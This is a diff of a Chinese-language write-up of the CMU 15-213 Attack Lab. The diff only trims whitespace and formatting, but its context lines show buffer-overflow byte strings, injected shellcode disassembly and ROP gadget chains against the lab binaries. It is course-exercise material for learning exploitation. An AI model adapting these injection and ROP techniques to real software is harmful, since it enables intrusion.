@@ -76,7 +76,7 @@ PASS: Would have posted the following:
 	user id	bovik
 	course	15213-f15
 	lab	attacklab
-	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
+	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
 
 ```
 
@@ -112,7 +112,7 @@ call <touch2>
 00 00 00 00 00 00 00 00     # 那么这里的地址是0xabcde8
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00     # 到这里填充完getbuf的栈帧  
+00 00 00 00 00 00 00 00     # 到这里填充完getbuf的栈帧
 e0 cd ab 00 00 00 00 00     # 这里篡改了ret的返回函数地址 <- %rsp + 0x28
 ```
 
@@ -152,7 +152,7 @@ Disassembly of section .text:
 0000000000000000 <.text>:
    0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
    5:	68 ec 17 40 00       	pushq  $0x4017ec
-   a:	c3                   	retq   
+   a:	c3                   	retq
 ```
 
 同时，需要知道当程序运行到`getbuf`时，`%rsp`寄存器的值，因为我们需要绕回到这个地址然后逐行执行攻击代码。
@@ -209,7 +209,7 @@ xx xx xx xx xx xx xx xx # <- %rsp的位置 同时也是缓冲区输入的位置
 下面是`getbuf`执行完毕后栈的情况:
 
 ```text
-?? ?? ?? ?? ?? ?? ?? ?? # test函数的栈帧 <- %rsp的位置 
+?? ?? ?? ?? ?? ?? ?? ?? # test函数的栈帧 <- %rsp的位置
 [ret address (64bit)]   # 因为ret将%rip的位置设置到了这一行的地址
 xx xx xx xx xx xx xx xx # getbuf分配了0x28 * 64bit的空间(64位机器)
 xx xx xx xx xx xx xx xx #
@@ -248,7 +248,7 @@ Disassembly of section .text:
 0000000000000000 <.text>:
    0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
    7:	68 fa 18 40 00       	pushq  $0x4018fa
-   c:	c3                   	retq   
+   c:	c3                   	retq
 
 ```
 
@@ -300,7 +300,7 @@ Disassembly of section .text:
 0000000000000000 <.text>:
    0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
    5:	68 ec 17 40 00       	pushq  $0x4017ec
-   a:	c3                   	retq   
+   a:	c3                   	retq
 ```
 
 然后我们能够控制的就是缓冲区的输入，替换掉ret的地址，然后一直链式反应，执行我们的代码.
@@ -371,7 +371,7 @@ fa 97 b9 59 00 00 00 00
 ec 17 40 00 00 00 00 00
 ```
 
-精彩，不过为什么没用到`farm`的代码段呢，*无所谓了*。
+精彩，不过为什么没用到`farm`的代码段呢，_无所谓了_。
 
 只要达到了攻击效果就行。
 
@@ -407,7 +407,7 @@ Phase5要求和Phase3一样，调用`touch3`并且传入字符串`cookie`
 
 ```text
 address + 0x28:[cookie的ASCII]  # <- %rdi + 0x20
-address + 0x20: [touch3的地址]    
+address + 0x20: [touch3的地址]
 address + 0x18: [add_xy()的地址]
 address + 0x10: [第二个参数:0x20]
 address + 0x8: [gadget 3的地址]  # mov %rsp, %rdi之前，%rsp是在这
@@ -457,7 +457,7 @@ c3       # ret
 
 ```text
 address + 0x38: [cookie的ASCII]  # <- %rdi + 0x30
-address + 0x30: [touch3的地址]     
+address + 0x30: [touch3的地址]
 address + 0x28: [gadget 6的地址]
 address + 0x20: [add_xy()的地址]
 address + 0x18: [第二个参数:0x28]
@@ -484,7 +484,7 @@ gadget 5: ret                   # 然后ret进入add_xy:0x4019d6
 
 ```text
 48 89 e0 # mov %rsp, %rax -> 0x401a06
-c3       # ret            
+c3       # ret
 48 89 c7 # mov %rax, %rdi -> 0x4019a2
 c3       # ret
 5e       # popq %rsi      -> 0x401383
